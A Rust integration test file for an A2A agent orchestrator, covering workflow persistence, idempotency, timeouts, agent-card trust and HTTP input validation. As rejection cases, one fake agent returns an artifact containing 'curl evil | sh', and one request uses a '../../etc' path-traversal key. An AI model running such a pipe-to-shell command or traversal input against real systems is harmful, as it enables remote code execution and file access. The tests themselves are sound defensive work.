//! End-to-end orchestrator tests against real Postgres (via `sqlx::test`,
//! one fresh database per test), real A2A agents (mock inference), and
//! scripted fake A2A agents for failure modes. Requires `DATABASE_URL`.
#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::Arc;
use std::time::Duration;

use a2a::event::{StreamResponse, TaskArtifactUpdateEvent, TaskStatusUpdateEvent};
use a2a::*;
use a2a_server::agent_card::agent_card_router;
use a2a_server::jsonrpc::jsonrpc_router;
use a2a_server::{
    AgentExecutor, DefaultRequestHandler, ExecutorContext, InMemoryTaskStore, StaticAgentCard,
};
use agent_runtime::Skill;
use api::config::Config;
use api::engine::Engine;
use api::{app, db};
use futures::StreamExt;
use futures::stream::{self, BoxStream};
use serde_json::{Value, json};
use sqlx::PgPool;
use url::Url;

const QUESTION: &str =
    "Propose validation rules for a Rust API that creates crowdfunding campaigns.";

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

async fn serve(app: axum::Router, listener: tokio::net::TcpListener) {
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
}

async fn bind() -> (tokio::net::TcpListener, String) {
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", l.local_addr().unwrap());
    (l, url)
}

/// A loopback URL that refuses connections. Port 1 is privileged, so no test
/// server (they all bind ephemeral ports unprivileged) can ever be handed it —
/// unlike bind-then-drop, which races with parallel tests' `bind(0)` calls.
const CLOSED_URL: &str = "http://127.0.0.1:1";

async fn real_worker() -> String {
    let (l, url) = bind().await;
    serve(worker_agent::router(&url, None), l).await;
    url
}

async fn real_reviewer() -> String {
    let (l, url) = bind().await;
    serve(reviewer_agent::router(&url, None), l).await;
    url
}

type Script = Arc<dyn Fn(&str, &str) -> Vec<StreamResponse> + Send + Sync>;

/// A scripted A2A agent built directly on the SDK server.
struct Scripted {
    delay: Duration,
    script: Script,
}

impl AgentExecutor for Scripted {
    fn execute(
        &self,
        ctx: ExecutorContext,
    ) -> BoxStream<'static, Result<StreamResponse, A2AError>> {
        let (t, c) = ctx.task_info();
        let events = (self.script)(&t, &c);
        let delay = self.delay;
        Box::pin(
            stream::once(async move {
                tokio::time::sleep(delay).await;
                events
            })
            .flat_map(|e| stream::iter(e.into_iter().map(Ok))),
        )
    }
    fn cancel(
        &self,
        _ctx: ExecutorContext,
    ) -> BoxStream<'static, Result<StreamResponse, A2AError>> {
        Box::pin(stream::empty())
    }
}

async fn fake_agent(card_name: &str, delay: Duration, script: Script) -> String {
    let (l, url) = bind().await;
    let mut card = worker_agent::Drafter::new(None).card(&url);
    card.name = card_name.into();
    let handler = Arc::new(DefaultRequestHandler::new(
        Scripted { delay, script },
        InMemoryTaskStore::new(),
    ));
    let router = axum::Router::new()
        .nest("/jsonrpc", jsonrpc_router(handler))
        .merge(agent_card_router(Arc::new(StaticAgentCard::new(card))));
    serve(router, l).await;
    url
}

/// Reports WORKING at once, then never finishes; records CancelTask calls.
struct Hanging {
    canceled: Arc<std::sync::atomic::AtomicBool>,
}

impl AgentExecutor for Hanging {
    fn execute(
        &self,
        ctx: ExecutorContext,
    ) -> BoxStream<'static, Result<StreamResponse, A2AError>> {
        let (t, c) = ctx.task_info();
        let working = status_ev(&t, &c, TaskState::Working, None);
        Box::pin(stream::iter([Ok(working)]).chain(stream::pending()))
    }
    fn cancel(&self, ctx: ExecutorContext) -> BoxStream<'static, Result<StreamResponse, A2AError>> {
        self.canceled
            .store(true, std::sync::atomic::Ordering::SeqCst);
        let (t, c) = ctx.task_info();
        Box::pin(stream::iter([Ok(status_ev(
            &t,
            &c,
            TaskState::Canceled,
            None,
        ))]))
    }
}

async fn hanging_agent(card_name: &str, canceled: Arc<std::sync::atomic::AtomicBool>) -> String {
    let (l, url) = bind().await;
    let mut card = worker_agent::Drafter::new(None).card(&url);
    card.name = card_name.into();
    let handler = Arc::new(DefaultRequestHandler::new(
        Hanging { canceled },
        InMemoryTaskStore::new(),
    ));
    let router = axum::Router::new()
        .nest("/jsonrpc", jsonrpc_router(handler))
        .merge(agent_card_router(Arc::new(StaticAgentCard::new(card))));
    serve(router, l).await;
    url
}

fn status_ev(t: &str, c: &str, state: TaskState, text: Option<&str>) -> StreamResponse {
    StreamResponse::StatusUpdate(TaskStatusUpdateEvent {
        task_id: t.into(),
        context_id: c.into(),
        status: TaskStatus {
            state,
            message: text.map(|s| Message::new(Role::Agent, vec![Part::text(s)])),
            timestamp: None,
        },
        metadata: None,
    })
}

fn artifact_ev(t: &str, c: &str, name: &str, data: Value) -> StreamResponse {
    StreamResponse::ArtifactUpdate(TaskArtifactUpdateEvent {
        task_id: t.into(),
        context_id: c.into(),
        artifact: Artifact {
            artifact_id: new_artifact_id(),
            name: Some(name.into()),
            description: None,
            parts: vec![Part::data(data)],
            metadata: None,
            extensions: None,
        },
        append: Some(false),
        last_chunk: Some(true),
        metadata: None,
    })
}

struct Harness {
    base: String,
    http: reqwest::Client,
    pool: PgPool,
}

fn config(worker: &str, reviewer: &str, timeout: Duration) -> Config {
    Config {
        bind: "127.0.0.1:0".into(),
        database_url: "postgres://unused".into(),
        db_max_connections: 5,
        worker_url: Url::parse(worker).unwrap(),
        reviewer_url: Url::parse(reviewer).unwrap(),
        agent_timeout: timeout,
        poll_interval: Duration::from_millis(50),
        frontend_dir: None,
    }
}

async fn harness(pool: PgPool, worker: &str, reviewer: &str, timeout: Duration) -> Harness {
    let engine = Engine::new(pool.clone(), &config(worker, reviewer, timeout)).unwrap();
    let (l, base) = bind().await;
    serve(app(engine, None), l).await;
    Harness {
        base,
        http: reqwest::Client::new(),
        pool,
    }
}

impl Harness {
    async fn submit(&self, question: &str) -> reqwest::Response {
        self.http
            .post(format!("{}/api/workflows", self.base))
            .json(&json!({ "question": question }))
            .send()
            .await
            .unwrap()
    }

    async fn get(&self, id: &str) -> Value {
        self.http
            .get(format!("{}/api/workflows/{id}", self.base))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap()
    }

    async fn wait_terminal(&self, id: &str) -> Value {
        for _ in 0..300 {
            let w = self.get(id).await;
            if w["status"] == "completed" || w["status"] == "failed" {
                return w;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        panic!("workflow {id} did not finish");
    }

    async fn run(&self) -> Value {
        let r = self.submit(QUESTION).await;
        assert_eq!(r.status(), 202);
        let id = r.json::<Value>().await.unwrap()["id"]
            .as_str()
            .unwrap()
            .to_owned();
        self.wait_terminal(&id).await
    }
}

const SECS_5: Duration = Duration::from_secs(5);

// ---------------------------------------------------------------------------
// Happy path, persistence, recovery
// ---------------------------------------------------------------------------

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn full_workflow_completes_and_persists(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool.clone(), &w, &r, SECS_5).await;

    let wf = h.run().await;
    assert_eq!(wf["status"], "completed");
    // needs_changes is a successful review, not a failure.
    assert_eq!(wf["verdict"], "needs_changes");
    assert!(wf["error"].is_null());
    assert!(
        wf["draft"]["title"]
            .as_str()
            .unwrap()
            .starts_with("Mock draft:")
    );
    assert_eq!(wf["draft"]["mock"], true, "mock flag must reach the API");
    assert_eq!(wf["review"]["verdict"], "needs_changes");
    assert!(!wf["review"]["findings"].as_array().unwrap().is_empty());
    let runs = wf["runs"].as_array().unwrap();
    assert_eq!(runs.len(), 2);
    assert_eq!(runs[0]["agent"], "worker");
    assert_eq!(runs[1]["agent"], "reviewer");
    for run in runs {
        assert_eq!(run["status"], "completed");
        assert_eq!(run["a2a_state"], "TASK_STATE_COMPLETED");
        assert!(run["a2a_task_id"].is_string());
    }
    assert!(wf["started_at"].is_string() && wf["finished_at"].is_string());

    // Simulated API restart: a fresh engine + app on the same database.
    let h2 = harness(pool, &w, &r, SECS_5).await;
    let again = h2.get(wf["id"].as_str().unwrap()).await;
    assert_eq!(again["review"], wf["review"]);
    assert_eq!(again["draft"], wf["draft"]);

    let list: Value = h2
        .http
        .get(format!("{}/api/workflows", h2.base))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(list["items"][0]["id"], wf["id"]);
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn reviewer_pass_verdict(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool, &w, &r, SECS_5).await;
    let resp = h
        .submit("Define currency limit rules with a maximum goal for campaigns.")
        .await;
    let id = resp.json::<Value>().await.unwrap()["id"]
        .as_str()
        .unwrap()
        .to_owned();
    let wf = h.wait_terminal(&id).await;
    assert_eq!(wf["status"], "completed");
    assert_eq!(wf["verdict"], "pass");
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn restart_recovery_fails_interrupted_workflows(pool: PgPool) {
    let (wf, _) = db::create_workflow(&pool, QUESTION, None).await.unwrap();
    db::mark_running(&pool, wf.id).await.unwrap();
    db::start_run(&pool, wf.id, "worker").await.unwrap();

    assert_eq!(db::recover_interrupted(&pool).await.unwrap(), 1);
    let after = db::get_workflow(&pool, wf.id).await.unwrap().unwrap();
    assert_eq!(after.status, "failed");
    assert!(after.error.unwrap().contains("restart"));
    assert_eq!(
        db::get_runs(&pool, wf.id).await.unwrap()[0].status,
        "failed"
    );
    // Admission slot is free again.
    db::create_workflow(&pool, QUESTION, None).await.unwrap();
}

// ---------------------------------------------------------------------------
// Admission control and idempotency
// ---------------------------------------------------------------------------

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn concurrent_submissions_admit_exactly_one(pool: PgPool) {
    let slow: Script = Arc::new(|t, c| {
        vec![
            artifact_ev(
                t,
                c,
                "draft",
                json!({"title":"t","summary":"s","content":"c","assumptions":[]}),
            ),
            status_ev(t, c, TaskState::Completed, None),
        ]
    });
    let w = fake_agent("Draft Worker", Duration::from_millis(800), slow).await;
    let r = real_reviewer().await;
    let h = Arc::new(harness(pool, &w, &r, SECS_5).await);

    let tasks: Vec<_> = (0..10)
        .map(|_| {
            let h = h.clone();
            tokio::spawn(async move { h.submit(QUESTION).await.status().as_u16() })
        })
        .collect();
    let mut codes = Vec::new();
    for t in tasks {
        codes.push(t.await.unwrap());
    }
    assert_eq!(
        codes.iter().filter(|c| **c == 202).count(),
        1,
        "codes: {codes:?}"
    );
    assert_eq!(
        codes.iter().filter(|c| **c == 409).count(),
        9,
        "codes: {codes:?}"
    );

    // Once finished, a new workflow is admitted.
    let rows = db::list_workflows(&h.pool, 10, None).await.unwrap();
    h.wait_terminal(&rows[0].id.to_string()).await;
    assert_eq!(h.submit(QUESTION).await.status(), 202);
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn idempotency_key_returns_existing_workflow(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool, &w, &r, SECS_5).await;
    let send = || {
        h.http
            .post(format!("{}/api/workflows", h.base))
            .header("Idempotency-Key", "submit-1234")
            .json(&json!({ "question": QUESTION }))
            .send()
    };
    let a = send().await.unwrap();
    assert_eq!(a.status(), 202);
    let a: Value = a.json().await.unwrap();
    let b = send().await.unwrap();
    assert_eq!(b.status(), 200);
    let b: Value = b.json().await.unwrap();
    assert_eq!(a["id"], b["id"]);
    h.wait_terminal(a["id"].as_str().unwrap()).await;
    assert_eq!(
        db::list_workflows(&h.pool, 10, None).await.unwrap().len(),
        1
    );
}

/// REVIEW-002: a reused key with a different body must not return another
/// workflow (silently answering a different question).
#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn idempotency_key_reuse_with_different_question_is_rejected(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool, &w, &r, SECS_5).await;
    let send = |question: &'static str| {
        h.http
            .post(format!("{}/api/workflows", h.base))
            .header("Idempotency-Key", "submit-reused")
            .json(&json!({ "question": question }))
            .send()
    };
    let a = send(QUESTION).await.unwrap();
    assert_eq!(a.status(), 202);
    let a: Value = a.json().await.unwrap();
    h.wait_terminal(a["id"].as_str().unwrap()).await;

    let b = send("A different question about pagination limits.")
        .await
        .unwrap();
    assert_eq!(b.status(), 422);
    let b: Value = b.json().await.unwrap();
    assert_eq!(b["error"]["code"], "idempotency_key_mismatch");
    // Surrounding whitespace is not a different question.
    let c = h
        .http
        .post(format!("{}/api/workflows", h.base))
        .header("Idempotency-Key", "submit-reused")
        .json(&json!({ "question": format!("  {QUESTION}\n") }))
        .send()
        .await
        .unwrap();
    assert_eq!(c.status(), 200);
    assert_eq!(
        db::list_workflows(&h.pool, 10, None).await.unwrap().len(),
        1
    );
}

// ---------------------------------------------------------------------------
// A2A interaction variants and failures
// ---------------------------------------------------------------------------

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn direct_message_response_is_supported(pool: PgPool) {
    let reply: Script = Arc::new(|_, _| {
        let review = json!({"verdict":"pass","summary":"Looks good","findings":[]});
        vec![StreamResponse::Message(Message::new(
            Role::Agent,
            vec![Part::data(review)],
        ))]
    });
    let w = real_worker().await;
    let r = fake_agent("Draft Reviewer", Duration::ZERO, reply).await;
    let wf = harness(pool, &w, &r, SECS_5).await.run().await;
    assert_eq!(wf["status"], "completed", "{wf}");
    assert_eq!(wf["verdict"], "pass");
    assert_eq!(wf["runs"][1]["a2a_state"], "message");
}

/// REVIEW-001: a failure after the run was started (here: persisting the
/// artifact) must leave the agent run `failed`, never stuck in `running`.
#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn persistence_failure_marks_run_failed(pool: PgPool) {
    // Make storing the Worker's draft fail inside this test's own database.
    sqlx::query("ALTER TABLE artifacts ADD CONSTRAINT test_block_drafts CHECK (kind <> 'draft')")
        .execute(&pool)
        .await
        .unwrap();
    let (w, r) = (real_worker().await, real_reviewer().await);
    let wf = harness(pool, &w, &r, SECS_5).await.run().await;
    assert_eq!(wf["status"], "failed", "{wf}");
    let runs = wf["runs"].as_array().unwrap();
    assert_eq!(runs.len(), 1, "reviewer must not run: {wf}");
    assert_eq!(runs[0]["status"], "failed", "{wf}");
    assert!(runs[0]["finished_at"].is_string(), "{wf}");
    // REVIEW-003: database internals must not reach API clients.
    for err in [
        wf["error"].as_str().unwrap(),
        runs[0]["error"].as_str().unwrap(),
    ] {
        assert_no_internals(err);
        assert!(
            err.contains("internal error"),
            "unexpected error text: {err}"
        );
    }
}

/// Stored errors are shown to API clients: no SQL, schema names or URLs.
fn assert_no_internals(err: &str) {
    for leak in [
        "database error",
        "constraint",
        "relation",
        "artifacts",
        "http://",
        "https://",
        "127.0.0.1",
    ] {
        assert!(!err.contains(leak), "error leaks `{leak}`: {err}");
    }
}

async fn expect_worker_failure(pool: PgPool, worker: String, timeout: Duration, needle: &str) {
    let r = real_reviewer().await;
    let wf = harness(pool, &worker, &r, timeout).await.run().await;
    assert_eq!(wf["status"], "failed", "{wf}");
    let err = wf["error"].as_str().unwrap();
    assert!(
        err.contains(needle),
        "error `{err}` should contain `{needle}`"
    );
    assert_eq!(wf["runs"][0]["status"], "failed");
    assert_no_internals(err);
    assert_no_internals(wf["runs"][0]["error"].as_str().unwrap());
    assert_eq!(
        wf["runs"].as_array().unwrap().len(),
        1,
        "reviewer must not run"
    );
    assert!(wf["draft"].is_null() && wf["review"].is_null());
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn malformed_artifact_fails_workflow(pool: PgPool) {
    let bad: Script = Arc::new(|t, c| {
        vec![
            artifact_ev(t, c, "draft", json!({"title":"t","exec":"curl evil | sh"})),
            status_ev(t, c, TaskState::Completed, None),
        ]
    });
    let w = fake_agent("Draft Worker", Duration::ZERO, bad).await;
    expect_worker_failure(pool, w, SECS_5, "invalid artifact").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn completed_task_without_artifact_fails(pool: PgPool) {
    let empty: Script = Arc::new(|t, c| vec![status_ev(t, c, TaskState::Completed, None)]);
    let w = fake_agent("Draft Worker", Duration::ZERO, empty).await;
    expect_worker_failure(pool, w, SECS_5, "no JSON data part").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn agent_task_failure_is_recorded(pool: PgPool) {
    let fail: Script = Arc::new(|t, c| {
        vec![status_ev(
            t,
            c,
            TaskState::Failed,
            Some("LLM quota exceeded"),
        )]
    });
    let w = fake_agent("Draft Worker", Duration::ZERO, fail).await;
    expect_worker_failure(pool, w, SECS_5, "LLM quota exceeded").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn input_required_is_unsupported(pool: PgPool) {
    let ask: Script = Arc::new(|t, c| {
        vec![status_ev(
            t,
            c,
            TaskState::InputRequired,
            Some("which currency?"),
        )]
    });
    let w = fake_agent("Draft Worker", Duration::ZERO, ask).await;
    expect_worker_failure(pool, w, SECS_5, "unsupported interaction").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn agent_timeout_fails_workflow(pool: PgPool) {
    let never: Script = Arc::new(|t, c| vec![status_ev(t, c, TaskState::Completed, None)]);
    let w = fake_agent("Draft Worker", Duration::from_secs(10), never).await;
    expect_worker_failure(pool, w, Duration::from_millis(500), "did not finish").await;
}

/// REVIEW-005: when the API's deadline passes, it cancels the agent's task
/// (so the agent stops spending) instead of just walking away.
#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn timeout_cancels_the_agent_task(pool: PgPool) {
    let canceled = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let w = hanging_agent("Draft Worker", canceled.clone()).await;
    let r = real_reviewer().await;
    let wf = harness(pool, &w, &r, Duration::from_millis(800))
        .await
        .run()
        .await;
    assert_eq!(wf["status"], "failed", "{wf}");
    assert!(
        wf["error"].as_str().unwrap().contains("did not finish"),
        "{wf}"
    );
    assert_eq!(wf["runs"][0]["status"], "failed", "{wf}");
    for _ in 0..100 {
        if canceled.load(std::sync::atomic::Ordering::SeqCst) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("the agent never received CancelTask after the deadline");
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn unavailable_agent_fails_workflow(pool: PgPool) {
    let url = CLOSED_URL.to_string();
    expect_worker_failure(pool, url, SECS_5, "unreachable").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn untrusted_card_is_refused(pool: PgPool) {
    let ok: Script = Arc::new(|t, c| vec![status_ev(t, c, TaskState::Completed, None)]);
    let w = fake_agent("Impostor Agent", Duration::ZERO, ok).await;
    expect_worker_failure(pool, w, SECS_5, "untrusted agent card").await;
}

/// Serves `body` (or a 404 when `None`) at the Agent Card path.
async fn card_server(body: Option<Value>) -> String {
    let (l, url) = bind().await;
    let router = match body {
        Some(b) => axum::Router::new().route(
            "/.well-known/agent-card.json",
            axum::routing::get(move || async move { axum::Json(b) }),
        ),
        None => axum::Router::new(),
    };
    serve(router, l).await;
    url
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn malformed_agent_card_is_invalid_not_unreachable(pool: PgPool) {
    let w = card_server(Some(json!({"hello": "not an agent card"}))).await;
    expect_worker_failure(pool, w, SECS_5, "invalid agent card").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn missing_agent_card_is_invalid(pool: PgPool) {
    let w = card_server(None).await;
    expect_worker_failure(pool, w, SECS_5, "invalid agent card").await;
}

// ---------------------------------------------------------------------------
// Reviewer-stage failures: the Worker draft must be preserved
// ---------------------------------------------------------------------------

async fn expect_reviewer_failure(pool: PgPool, reviewer: String, needle: &str) {
    let w = real_worker().await;
    let wf = harness(pool, &w, &reviewer, SECS_5).await.run().await;
    assert_eq!(wf["status"], "failed", "{wf}");
    let err = wf["error"].as_str().unwrap();
    assert!(err.starts_with("reviewer: "), "{err}");
    assert!(
        err.contains(needle),
        "error `{err}` should contain `{needle}`"
    );
    assert_no_internals(err);
    let runs = wf["runs"].as_array().unwrap();
    assert_eq!(runs.len(), 2, "{wf}");
    assert_eq!(runs[0]["agent"], "worker");
    assert_eq!(runs[0]["status"], "completed");
    assert_eq!(runs[1]["agent"], "reviewer");
    assert_eq!(runs[1]["status"], "failed");
    // The Worker's draft survives a Reviewer failure; no review is invented.
    assert!(
        wf["draft"]["title"]
            .as_str()
            .unwrap()
            .starts_with("Mock draft:")
    );
    assert_eq!(wf["draft"]["mock"], true, "mock flag must reach the API");
    assert!(wf["review"].is_null());
    assert!(wf["verdict"].is_null());
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn reviewer_unavailable_preserves_draft(pool: PgPool) {
    let url = CLOSED_URL.to_string();
    expect_reviewer_failure(pool, url, "unreachable").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn malformed_review_preserves_draft(pool: PgPool) {
    let bad: Script = Arc::new(|t, c| {
        vec![
            artifact_ev(
                t,
                c,
                "review",
                json!({"verdict": "maybe", "summary": "s", "findings": []}),
            ),
            status_ev(t, c, TaskState::Completed, None),
        ]
    });
    let r = fake_agent("Draft Reviewer", Duration::ZERO, bad).await;
    expect_reviewer_failure(pool, r, "invalid artifact").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn reviewer_auth_required_is_unsupported(pool: PgPool) {
    let auth: Script =
        Arc::new(|t, c| vec![status_ev(t, c, TaskState::AuthRequired, Some("log in"))]);
    let r = fake_agent("Draft Reviewer", Duration::ZERO, auth).await;
    expect_reviewer_failure(pool, r, "unsupported interaction").await;
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn reviewer_timeout_preserves_draft(pool: PgPool) {
    let never: Script = Arc::new(|t, c| vec![status_ev(t, c, TaskState::Completed, None)]);
    let r = fake_agent("Draft Reviewer", Duration::from_secs(10), never).await;
    let w = real_worker().await;
    let wf = harness(pool, &w, &r, Duration::from_millis(500))
        .await
        .run()
        .await;
    assert_eq!(wf["status"], "failed", "{wf}");
    assert!(
        wf["error"].as_str().unwrap().contains("did not finish"),
        "{wf}"
    );
    assert_eq!(wf["runs"][1]["status"], "failed");
    assert!(wf["draft"].is_object() && wf["review"].is_null());
}

// ---------------------------------------------------------------------------
// HTTP validation
// ---------------------------------------------------------------------------

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn versioned_paths_and_liveness(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool, &w, &r, SECS_5).await;

    let live = h
        .http
        .get(format!("{}/healthz", h.base))
        .send()
        .await
        .unwrap();
    assert_eq!(live.status(), 200);
    assert_eq!(live.json::<Value>().await.unwrap()["status"], "ok");

    let resp = h
        .http
        .post(format!("{}/api/v1/workflows", h.base))
        .json(&json!({ "question": QUESTION }))
        .send()
        .await
        .unwrap();
    assert_eq!(resp.status(), 202);
    let id = resp.json::<Value>().await.unwrap()["id"]
        .as_str()
        .unwrap()
        .to_owned();
    let mut wf = Value::Null;
    for _ in 0..300 {
        wf = h
            .http
            .get(format!("{}/api/v1/workflows/{id}", h.base))
            .send()
            .await
            .unwrap()
            .json()
            .await
            .unwrap();
        if wf["status"] == "completed" || wf["status"] == "failed" {
            break;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    assert_eq!(wf["status"], "completed", "{wf}");
    assert!(wf["draft"].is_object() && wf["review"].is_object());

    let bad = h
        .http
        .post(format!("{}/api/v1/workflows", h.base))
        .json(&json!({"question": "short"}))
        .send()
        .await
        .unwrap();
    assert_eq!(bad.status(), 422);
    let body: Value = bad.json().await.unwrap();
    assert_eq!(body["error"]["code"], "validation_failed");

    let missing = h
        .http
        .get(format!("{}/api/v1/nope", h.base))
        .send()
        .await
        .unwrap();
    assert_eq!(missing.status(), 404);
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn api_input_validation(pool: PgPool) {
    let (w, r) = (real_worker().await, real_reviewer().await);
    let h = harness(pool, &w, &r, SECS_5).await;
    let post = |body: String| {
        h.http
            .post(format!("{}/api/workflows", h.base))
            .header("content-type", "application/json")
            .body(body)
            .send()
    };
    assert_eq!(
        post(json!({"question":"short"}).to_string())
            .await
            .unwrap()
            .status(),
        422
    );
    assert_eq!(
        post(json!({"question": QUESTION, "admin": true}).to_string())
            .await
            .unwrap()
            .status(),
        422
    );
    assert_eq!(post("{not json".into()).await.unwrap().status(), 422);
    assert_eq!(
        post(json!({"question": "x".repeat(20_000)}).to_string())
            .await
            .unwrap()
            .status(),
        413
    );
    let bad_key = h
        .http
        .post(format!("{}/api/workflows", h.base))
        .header("Idempotency-Key", "../../etc")
        .json(&json!({"question": QUESTION}))
        .send()
        .await
        .unwrap();
    assert_eq!(bad_key.status(), 422);

    let r = h
        .http
        .get(format!("{}/api/workflows/not-a-uuid", h.base))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 404);
    let r = h
        .http
        .get(format!("{}/api/workflows/{}", h.base, uuid::Uuid::nil()))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 404);
    let r = h
        .http
        .get(format!("{}/api/workflows?limit=1000", h.base))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 422);

    let health = h
        .http
        .get(format!("{}/api/health", h.base))
        .send()
        .await
        .unwrap();
    assert_eq!(health.status(), 200);
    assert_eq!(health.headers()["x-content-type-options"], "nosniff");
    assert!(health.headers().contains_key("x-request-id"));

    let agents: Value = h
        .http
        .get(format!("{}/api/agents", h.base))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(agents["agents"][0]["reachable"], true);
    assert_eq!(agents["agents"][1]["name"], "Draft Reviewer");
}

#[sqlx::test(migrator = "api::db::MIGRATOR")]
async fn static_dashboard_gets_security_headers(pool: PgPool) {
    let dir = std::env::temp_dir().join(format!("a2a-ui-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("index.html"), "<p>ui</p>").unwrap();
    std::fs::write(dir.join("404.html"), "nf").unwrap();
    let engine = Engine::new(
        pool,
        &config("http://127.0.0.1:1", "http://127.0.0.1:2", SECS_5),
    )
    .unwrap();
    let (l, base) = bind().await;
    serve(app(engine, Some(&dir)), l).await;
    for path in ["/", "/missing-page"] {
        let r = reqwest::get(format!("{base}{path}")).await.unwrap();
        assert!(
            r.headers()["content-security-policy"]
                .to_str()
                .unwrap()
                .contains("script-src 'self'")
        );
        assert_eq!(r.headers()["x-frame-options"], "DENY");
        assert_eq!(r.headers()["x-content-type-options"], "nosniff");
    }
    std::fs::remove_dir_all(dir).ok();
}
